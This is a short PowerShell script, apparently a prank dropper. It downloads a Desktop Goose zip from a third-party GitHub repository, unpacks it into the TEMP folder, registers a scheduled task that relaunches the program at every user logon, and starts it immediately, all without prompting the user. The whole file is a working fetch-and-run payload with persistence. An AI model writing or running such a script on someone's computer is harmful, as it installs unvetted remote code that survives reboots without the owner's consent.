$gooseUrl = "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/main/DesktopGoose.zip"
$tempPath = "$env:TEMP\goose"
$zipPath = "$tempPath\goose.zip"
$exePath = "$tempPath\GooseDesktop.exe"
$taskName = "RunDesktopGoose"

# Criar diretório temporário
New-Item -ItemType Directory -Path $tempPath -Force | Out-Null

# Baixar e extrair arquivos
Invoke-WebRequest -Uri $gooseUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $tempPath -Force
Move-Item -Path "$tempPath\DesktopGoose v0.31\*" -Destination $tempPath -Force
Remove-Item -Path "$tempPath\DesktopGoose v0.31" -Recurse -Force

# Criar ação para rodar o Desktop Goose
$action = New-ScheduledTaskAction -Execute $exePath

# Gatilho para iniciar APENAS no login do usuário
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Configurar a tarefa para rodar com privilégios normais do usuário logado
$principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -LogonType Interactive -RunLevel Limited

# Criar e registrar a tarefa agendada
$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
Start-Process -FilePath "$env:TEMP\goose\GooseDesktop.exe"
